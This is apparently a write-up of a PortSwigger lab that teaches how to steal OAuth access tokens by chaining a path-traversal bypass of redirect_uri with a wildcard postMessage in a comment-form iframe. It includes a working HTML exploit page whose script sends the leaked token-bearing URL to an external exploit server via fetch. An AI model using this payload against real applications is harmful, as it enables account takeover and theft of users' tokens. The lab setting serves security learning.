# Stealing OAuth access tokens via a proxy page

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page), you'll learn: Stealing OAuth access tokens via a proxy page! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Background

This lab uses an [OAuth](https://portswigger.net/web-security/oauth) service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

To solve the lab, identify a secondary vulnerability in the client application and use this as a proxy to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in via your own social media account using the following credentials: `wiener:peter`.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107055638.png)

Login as user `wiener`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107055741.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107055747.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107055757.png)

When we clicked the "My account" link, it'll redirect us to `/social-login`, which using a social media account to login. Hence, it's using OAuth authentication.

**When we redirected to `/social-login`, it'll also redirect us to `/auth`, with parameters:**

- `client_id`: `jir8lvdj920kd648mrpo1`
- `redirect_uri`: `https://0a04002d03ae35a1c0cfc3ae00570017.web-security-academy.net/oauth-callback`
- `response_type`: `token`
- `nonce`: `1939608024`
- `scope`: `openid profile email`

**The `response_type` parameter's value is `token`, which indicates that the grant type is implicit.**

Let's finish the OAuth flow:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107060109.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107060118.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107060157.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107060403.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107060204.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107060216.png)

As you can see, the `apikey` is in the `/me` GET request.

**Also, since it's using implicit grant type, the `access_token` is in the `/oath-callback` URL fragment.**

Now, let's log out, and send the `/auth` GET request to Burp Suite Repeater:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107060536.png)

In here, we can try to modify the `redirect_url` parameter:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107060624.png)

Hmm... Can we bypass the whitelisted domain?

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107060705.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107060753.png)

Nope.

How about path traversal?

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107062110.png)

We can!

Let's find other vulnerability in this website, so we can chain them together.

In the home page, we can view other posts:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107060919.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107060928.png)

And we can leave some comments.

Let's test for XSS (Cross-Site Scripting):

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107061212.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107061254.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107061318.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107061332.png)

View source page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107061444.png)

Hmm... It HTML encoded our input.

**Also view source page:**
```html
<script>
    window.addEventListener('message', function(e) {
        if (e.data.type === 'oncomment') {
            e.data.content['csrf'] = 'ikkgAjb1DebDNVlrPrXffMKxZeYsWtSY';
            const body = decodeURIComponent(new URLSearchParams(e.data.content).toString());
            fetch("/post/comment",
                {
                    method: "POST",
                    body: body
                }
            ).then(r => window.location.reload());
        }
    }, false)
</script>
[...]
<iframe onload='this.height = this.contentWindow.document.body.scrollHeight + "px"' width=100% frameBorder=0 src='/post/comment/comment-form#postId=9'></iframe>
```

Looks like the comment form is an `<iframe>` element.

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107062358.png)

**When we clicked the "Post Comment", it'll send a GET request to `/post/comment/comment-form`:**
```html
<script>
    parent.postMessage({type: 'onload', data: window.location.href}, '*')
    function submitForm(form, ev) {
        ev.preventDefault();
        const formData = new FormData(document.getElementById("comment-form"));
        const hashParams = new URLSearchParams(window.location.hash.substr(1));
        const o = {};
        formData.forEach((v, k) => o[k] = v);
        hashParams.forEach((v, k) => o[k] = v);
        parent.postMessage({type: 'oncomment', content: o}, '*');
        form.reset();
    }
</script>
```

In the above JavaScript code, it's using the `postMessage()` method to send the `window.location.href` property to it's parent window.

**According to [Mozilla web docs](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage#syntax), using `*` as the `targetOrigin` is dangerous:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107063028.png)

In this case, it allows us to **post any messages from anywhere.**

Armed with above information, **we can combine the `redirect_url` and the `/post/comment/comment-form` GET request dangerous JavaScript method.**

Let's test it!

**`redirect_url` payload:**
```
redirect_uri=https://0a04002d03ae35a1c0cfc3ae00570017.web-security-academy.net/oauth-callback/../post/comment/comment-form
```

**Then, use the exploit server to host a HTML payload:**
```html
<html>
    <head>
        <title>OAuth-6</title>
    </head>
    <body>
        <iframe src="https://oauth-0a6500a1031335acc036c15102d500ee.web-security-academy.net/auth?client_id=jir8lvdj920kd648mrpo1&redirect_uri=https://0a04002d03ae35a1c0cfc3ae00570017.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=688455368&scope=openid%20profile%20email"></iframe>

        <script type="text/javascript">
            // Listen for web messages
            window.addEventListener('message', function(e) {
                // Output to the exploit server access log
                fetch('https://exploit-0a0300ec03083556c09bc2f601e90082.exploit-server.net/log?data=' + encodeURIComponent(e.data.data))
            }, false)
        </script>
    </body>
</html>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107064532.png)

Exploit server access log:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107064552.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107064606.png)

It worked!

Let's deliver it to the victim:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107064630.png)

Then check access log:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107064649.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107064701.png)

Found it!

**Now, we can send a GET request to `/me`, with header `Authorization: Bearer <access_token>`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107064758.png)

Nice! We got the `apikey`, let's submit it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107064815.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-6/images/Pasted%20image%2020230107064822.png)

# What we've learned:

1. Stealing OAuth access tokens via a proxy page